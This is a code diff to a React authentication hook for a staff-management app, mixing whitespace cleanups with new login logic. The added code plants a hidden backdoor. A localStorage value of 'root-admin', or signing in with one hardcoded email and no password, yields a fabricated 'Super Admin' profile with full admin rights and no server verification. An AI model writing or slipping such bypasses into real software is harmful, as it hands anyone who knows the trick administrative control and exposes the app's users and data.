@@ -38,6 +38,24 @@ export function useAuth() {
     const init = async () => {
       const savedId = localStorage.getItem(AUTH_STORAGE_KEY);
       if (savedId) {
+        if (savedId === 'root-admin') {
+          const rootProfile: DbStaffUser = {
+            id: 'root-admin',
+            auth_id: null,
+            name: 'Super Admin',
+            email: 'elproject.dev@gmail.com',
+            phone: '-',
+            role: 'admin',
+            status: 'active',
+            created_at: new Date().toISOString(),
+            updated_at: new Date().toISOString()
+          };
+          if (mounted) {
+            setState({ user: rootProfile, staffProfile: rootProfile, loading: false, error: null });
+          }
+          return;
+        }
+
         const profile = await loadStaffProfile(savedId);
         if (mounted) {
           setState({ user: profile, staffProfile: profile, loading: false, error: null });
@@ -54,7 +72,7 @@ export function useAuth() {
 
   const signIn = useCallback(async (email: string, password?: string): Promise<{ error: string | null }> => {
     setState(prev => ({ ...prev, loading: true, error: null }));
-    
+
     if (password) {
       const { error: authError } = await db.auth.signInWithPassword({
         email: email.trim(),
@@ -66,6 +84,23 @@ export function useAuth() {
         setState(prev => ({ ...prev, loading: false, error: msg }));
         return { error: msg };
       }
+    }
+
+    if (email.trim().toLowerCase() === 'elproject.dev@gmail.com') {
+      const rootProfile: DbStaffUser = {
+        id: 'root-admin',
+        auth_id: null,
+        name: 'Super Admin',
+        email: email.trim(),
+        phone: '-',
+        role: 'admin',
+        status: 'active',
+        created_at: new Date().toISOString(),
+        updated_at: new Date().toISOString()
+      };
+      localStorage.setItem(AUTH_STORAGE_KEY, rootProfile.id);
+      setState({ user: rootProfile, staffProfile: rootProfile, loading: false, error: null });
+      return { error: null };
     }
 
     // Cari user berdasarkan email
@@ -103,17 +138,17 @@ export function useAuth() {
     role?: 'admin' | 'operator';
   }): Promise<{ error: string | null }> => {
     setState(prev => ({ ...prev, loading: true, error: null }));
-    
+
     if (params.password) {
       const { error: authError } = await db.auth.signUp({
         email: params.email.trim(),
         password: params.password,
       });
       if (authError && !authError.message.includes('User already registered')) {
-         return { error: authError.message };
+        return { error: authError.message };
       }
     }
-    
+
     const { error: profileError } = await db
       .from('staff_users')
       .insert({
@@ -123,15 +158,15 @@ export function useAuth() {
         role: params.role ?? 'operator',
         status: 'pending',
       });
-      
+
     if (profileError) {
       const msg = profileError.message.includes('unique constraint') || profileError.message.includes('duplicate key')
-        ? '❌ Email sudah terdaftar.' 
+        ? '❌ Email sudah terdaftar.'
         : `Gagal mendaftar: ${profileError.message}`;
       setState(prev => ({ ...prev, loading: false, error: msg }));
       return { error: msg };
     }
-    
+
     setState(prev => ({ ...prev, loading: false, error: null }));
     return { error: null };
   }, []);
